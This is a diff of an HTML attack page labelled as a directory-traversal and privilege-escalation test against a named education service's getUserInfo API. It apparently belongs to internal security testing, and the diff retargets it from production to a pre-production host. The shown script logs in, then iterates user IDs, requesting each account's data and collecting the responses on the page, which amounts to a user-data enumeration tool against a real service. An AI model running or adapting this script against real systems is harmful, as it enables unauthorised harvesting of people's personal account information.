@@ -23,7 +23,13 @@
     <h4>Directory Traversal Attack: getUserInfo</h4>
     <h5>also belong to privilege escalation attack.</h5>
 
-    <form action="javascript: login()">
+    <div class="memo">
+        <a href="http://wiki.feifanuniv.com/pages/viewpage.action?pageId=21595884" target="_blank" rel="noopener noreferrer">
+            <span>target api</span>
+        </a>
+    </div>
+
+    <form action="javascript: login()" class="memo">
         <label>userName</label>
         <input type="text" name="username" id="username">
         <label>password</label>
@@ -33,15 +39,10 @@
         <span id="loginResult"></span>
     </form>
 
-
     <div class="memo">
-        <a href="http://wiki.feifanuniv.com/pages/viewpage.action?pageId=21595884" target="_blank" rel="noopener noreferrer">
-            <span>target api</span>
-        </a>
+        <button onclick="traveGetUserInfo()">Start Travel</button>
+        <button onclick="stopTravel()">Stop Travel</button>
     </div>
-
-    <button onclick="traveGetUserInfo()">Start Travel</button>
-    <button onclick="stopTravel()">Stop Travel</button>
 
     <div id="travelResult">
         <h5>Traveling: <span id="count"></span></h5>
@@ -49,8 +50,8 @@
     </div>
 
     <script>
-        const login_api = "http://www.qingshuxuetang.com/qingshu-svc-home/v5_5/home/user/login";
-        const userInfo_api = "http://www.qingshuxuetang.com/qingshu-svc-home/v5_3/home/user/getUserInfo";
+        const login_api = "http://ppe.qingshuxuetang.com/qingshu-svc-home/v5_5/home/user/login";
+        const userInfo_api = "http://ppe.qingshuxuetang.com/qingshu-svc-home/v5_3/home/user/getUserInfo";
         const $resultUL = document.getElementById("result");
         const $count = document.getElementById("count");
         let token = "";
@@ -109,15 +110,17 @@
                 if (xhr.readyState === 4 && xhr.status === 200) {
                     let response = JSON.parse(xhr.responseText);
                     if (response && response.hr === 0 && response.data) {
-                        $resultUL.innerHTML += "<li><span style='font-style: italic;'>" + userId + " :  </span><span>" + JSON.stringify(response.data) + "</span</li>"
+                        $resultUL.innerHTML += "<li><span style='font-style: italic;'>" + userId +
+                            " :  </span><span>" + JSON.stringify(response.data) + "</span</li>"
                     }
                 }
             };
 
-            let requestBody = { userId: userId };
+            let requestBody = {
+                userId: userId
+            };
             xhr.send(JSON.stringify(requestBody));
         }
-
     </script>
 </body>
 
